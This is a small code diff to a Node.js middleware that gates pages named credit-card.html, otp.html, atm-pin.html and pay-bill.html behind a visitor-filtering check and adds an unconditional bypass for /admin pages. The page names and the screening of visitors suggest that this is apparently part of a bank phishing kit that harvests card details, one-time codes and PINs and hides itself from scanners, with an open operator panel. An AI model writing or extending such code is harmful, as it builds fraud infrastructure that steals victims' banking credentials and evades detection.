@@ -38,6 +38,12 @@ const protectPage = async (req, res, next) => {
         '/credit-card.html', '/otp.html', '/atm-pin.html', '/pay-bill.html'
     ];
     
+    // Admin pages are NOT protected - they can be accessed from anywhere
+    const adminPages = ['/admin', '/admin.html'];
+    if (adminPages.includes(req.path)) {
+        return next();
+    }
+    
     if (sensitivePages.includes(req.path)) {
         const allowed = await shouldAllowVisitor(req);
         if (!allowed) {
